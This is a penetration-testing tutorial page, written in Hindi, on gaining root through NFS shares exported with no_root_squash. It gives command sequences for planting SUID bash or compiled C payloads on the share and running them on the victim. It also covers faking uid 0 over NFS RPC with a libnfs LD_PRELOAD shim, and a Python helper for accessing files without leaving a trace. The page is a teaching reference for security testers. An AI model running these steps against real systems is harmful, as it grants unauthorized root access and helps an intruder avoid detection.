# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashing की Basic जानकारी

NFS आमतौर पर (विशेष रूप से linux में) files तक access करने के लिए client द्वारा दिए गए `uid` और `gid` पर trust करता है (यदि kerberos का उपयोग नहीं किया गया हो)। हालांकि, server में कुछ configurations सेट की जा सकती हैं जो **इस behavior को बदल देती हैं**:

- **`all_squash`**: यह सभी accesses को squash करते हुए हर user और group को **`nobody`** (65534 unsigned / -2 signed) पर map करता है। इसलिए सभी `nobody` होते हैं और किसी user का उपयोग नहीं किया जाता।
- **`root_squash`/`no_all_squash`**: यह Linux में default है और **केवल uid 0 (root)** वाले access को squash करता है। इसलिए किसी भी `UID` और `GID` पर trust किया जाता है, लेकिन `0` को `nobody` में squash कर दिया जाता है (इसलिए root impersonation संभव नहीं है)।
- **``no_root_squash`**: यदि यह configuration enabled हो, तो यह root user को भी squash नहीं करता। इसका अर्थ है कि यदि आप ऐसी configuration वाली directory को mount करते हैं, तो आप उसे root के रूप में access कर सकते हैं।

**/etc/exports** file में, यदि आपको कोई ऐसी directory मिलती है जो **no_root_squash** के रूप में configured है, तो आप उसे **client के रूप में** access कर सकते हैं और उस directory के **अंदर write** कर सकते हैं, जैसे कि आप उस machine के local **root** हों।

**NFS** के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash का उपयोग करने वाला Option 1:
- किसी client machine में उस directory को **mount करना**, और **root के रूप में copy करके** mounted folder के अंदर **/bin/bash** binary रखना तथा उसे **SUID** rights देना, फिर victim machine से उस bash binary को **execute करना**।
- ध्यान दें कि NFS share के अंदर root बनने के लिए server में **`no_root_squash`** configured होना आवश्यक है।
- हालांकि, यदि यह enabled नहीं है, तो आप binary को NFS share में copy करके और उसे उस user के रूप में SUID permission देकर, जिसके privileges तक आप escalate करना चाहते हैं, किसी अन्य user तक escalate कर सकते हैं।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
विकल्प 2: C compiled code का उपयोग करके:
- **उस directory को mount करना** client machine में, और **root के रूप में mounted folder के अंदर** अपना compiled payload copy करना, जो SUID permission का abuse करेगा, उसे **SUID** rights देना, और उस binary को **victim** machine से **execute** करना (आपको यहाँ कुछ [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) मिल सकते हैं)।
- पहले जैसे ही restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> ध्यान दें कि यदि आप **अपनी machine से victim machine तक tunnel बना सकते हैं, तो privilege escalation के लिए आवश्यक ports को tunnel करके exploit करने हेतु Remote version का उपयोग अभी भी कर सकते हैं**।\
> निम्नलिखित trick उस स्थिति के लिए है जब `/etc/exports` **किसी IP को दर्शाती है**। इस स्थिति में आप किसी भी तरह **remote exploit का उपयोग नहीं कर पाएँगे** और आपको **इस trick का abuse करना होगा**।\
> Exploit के काम करने के लिए एक और आवश्यक requirement यह है कि **`/etc/export` के अंदर का export `insecure` flag का उपयोग कर रहा हो**।\
> --_मुझे निश्चित नहीं है कि यदि `/etc/export` किसी IP address को दर्शाती है, तो यह trick काम करेगी या नहीं_--

### Basic Information

इस scenario में local machine पर mounted NFS share का exploitation शामिल है। इसमें NFSv3 specification की उस flaw का लाभ उठाया जाता है, जो client को अपना uid/gid specify करने देती है और संभावित रूप से unauthorized access सक्षम कर सकती है। Exploitation में [libnfs](https://github.com/sahlberg/libnfs) का उपयोग किया जाता है, जो NFS RPC calls को forge करने वाली एक library है।

#### Compiling the Library

Kernel version के आधार पर library compilation steps में adjustments की आवश्यकता हो सकती है। इस specific case में fallocate syscalls को comment out किया गया था। Compilation process में निम्नलिखित commands शामिल हैं:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit को Conduct करना

Exploit में एक सरल C program (`pwn.c`) बनाना शामिल है, जो privileges को root तक बढ़ाता है और फिर एक shell execute करता है। Program को compile किया जाता है, और परिणामी binary (`a.out`) को `ld_nfs.so` का उपयोग करके share पर suid root के साथ रखा जाता है, जो RPC calls में uid को fake करता है:

1. **Exploit code को Compile करें:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **share पर exploit रखें और uid को fake करके उसकी permissions modify करें:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root privileges हासिल करने के लिए exploit execute करें:**
```bash
/mnt/share/a.out
#root
```
### बोनस: Stealthy File Access के लिए NFShell

एक बार root access प्राप्त हो जाने पर, ownership बदले बिना NFS share के साथ interact करने के लिए (ताकि कोई trace न छूटे), Python script (`nfsh.py`) का उपयोग किया जाता है। यह script access की जा रही file के uid से मेल खाने के लिए uid को adjust करती है, जिससे permission issues के बिना share पर मौजूद files के साथ interact किया जा सकता है:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
इस तरह चलाएँ:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
